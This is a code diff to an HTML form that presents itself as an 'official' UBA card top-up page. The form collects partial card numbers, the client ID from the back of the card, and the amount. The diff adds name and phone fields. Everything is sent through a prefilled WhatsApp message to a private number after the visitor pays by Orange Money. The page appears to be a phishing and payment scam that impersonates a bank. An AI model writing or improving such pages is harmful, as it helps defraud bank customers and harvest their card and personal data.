@@ -4,6 +4,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/webp" href="img/chreol_Change_logo.webp">
+    <link rel="shortcut icon" href="img/chreol_Change_logo.webp">
+    <link rel="apple-touch-icon" href="img/chreol_Change_logo.webp">
+    <meta name="theme-color" content="#D4AF37">
     <title>Chreol Empire - Formulaire de Recharge UBA Officielle</title>
     <style>
         :root {
@@ -359,7 +363,21 @@
                 <label>Montant à créditer (FCFA)</label>
                 <input type="number" id="amt" placeholder="Minimum 1 500 F" oninput="calculer()">
             </div>
-
+            <div class="input-group">
+                <label>Nom & Prénom *</label>
+                <input type="text" id="fullname" 
+                placeholder="Ex: Jean Dupont"
+                required aria-required="true">
+            </div>
+            
+            <div class="input-group">
+                <label>Numéro de téléphone *</label>
+                <input type="tel" id="phone" 
+                placeholder="Ex: 697657734"
+                maxlength="15"
+                required aria-required="true">
+            </div>
+            
             <label>Choisissez votre mode de paiement</label>
             <div class="payment-methods">
                 <div class="method om active" onclick="setMethod('OM')">Orange Money</div>
@@ -377,7 +395,9 @@
                 <br /> Verifiez avant de valider.
             </div>
 
-            <button class="btn-send" onclick="validerEtEnvoyer()">Finaliser sur WhatsApp 🟢</button>
+            <button class="btn-send" onclick="validerEtEnvoyer()">
+                🚀 FINALISER MA RECHARGE UBA SUR WHATSAPP
+            </button>
 
             <p style="font-size: 11px; text-align: center; color: #888; margin-top: 15px;">
                 En cliquant, vous confirmez l'exactitude des informations fournies.<br />
@@ -441,6 +461,8 @@
                 { id: 'p6', label: 'les 6 premiers chiffres de la carte' },
                 { id: 'd4', label: 'les 4 derniers chiffres de la carte' },
                 { id: 'id_card', label: 'l\'ID Client au dos de la carte' },
+                { id: 'fullname', label: 'votre nom et prénom' },
+                { id: 'phone', label: 'votre numéro de téléphone' },
                 { id: 'amt', label: 'le montant de la recharge' }
             ];
 
@@ -459,9 +481,12 @@
                 `🆔 ID : ${document.getElementById('id_card').value}%0A` +
                 `💰 Montant : ${document.getElementById('amt').value} FCFA%0A` +
                 `🏦 Paiement : ${currentMethod}%0A` +
+                `👤 Nom : ${document.getElementById('fullname').value}%0A` +
+                `📞 Téléphone : ${document.getElementById('phone').value}%0A` +
                 `🔥 TOTAL : ${document.getElementById('view_total').innerText}%0A` +
                 `--------------------------%0A` +
-                `_Je vous apporte la preuve de paiement pour finaliser ma recharge maintenant._`;
+                `✅ Je confirme avoir effectué le paiement.%0A` +
+                `📸 Je vais envoyer immédiatement la preuve de paiement pour validation de ma recharge UBA.`;
 
             window.open(`https://wa.me/237697657734?text=${msg}`, '_blank');
         }
